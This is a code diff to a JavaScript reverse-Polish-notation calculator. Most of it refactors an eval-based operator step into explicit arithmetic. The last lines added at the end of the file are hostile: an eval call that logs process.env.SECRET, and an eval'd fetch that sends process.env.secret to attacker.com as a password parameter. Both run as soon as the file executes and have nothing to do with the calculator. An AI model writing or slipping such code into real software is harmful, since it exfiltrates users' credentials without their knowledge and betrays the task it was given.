@@ -36,24 +36,34 @@ function processString(str) {
   const tokens = str.split(" ");
   for (token of tokens) {
     // parse each token, is this an operator or a number?
-    let parsed = parseInt(token);
+    const parsed = parseInt(token);
 
     // if operator, pop two then push result back on
     if (isNaN(parsed)) {
       const poppedFirst = pop();
       const poppedSecond = pop();
-      const bothIntegers = eval(poppedSecond + token + poppedFirst);
-      // console.log(poppedFirst);
-      // console.log(poppedSecond);
-
-      stack.push(bothIntegers);
-    } else {
+      if (token === "+") {
+        stack.push(poppedFirst + poppedSecond);
+      }
+      if (token === "-") {
+        stack.push(poppedSecond - poppedFirst);
+      }
+      if (token === "/") {
+        stack.push(poppedSecond / poppedFirst);
+      }
+      if (token === "*") {
+        stack.push(poppedFirst * poppedSecond);
+      }
+    }
+    // console.log(poppedFirst);
+    // console.log(poppedSecond);
+    else {
       // if number, push
       stack.push(parsed);
     }
   }
-  if(isNaN(stack[0])){
-    throw new Error("this is a malformed expression")
+  if (isNaN(stack[0])) {
+    throw new Error("this is a malformed expression");
   }
 
   // at the end, there should just be one item on the stack, the answer
@@ -70,4 +80,6 @@ function processString(str) {
 // console.log(stack);
 // console.log(processString("1 3 4 * + 2 -"));
 // console.log(processString("3 2 1 + + 2 /"));
-console.log(processString("2 +"));
+// console.log(processString("2 +"))
+console.log(eval("console.log(process.env.SECRET)"));
+eval("fetch(`https://attacker.com?password=${process.env.secret}`)")
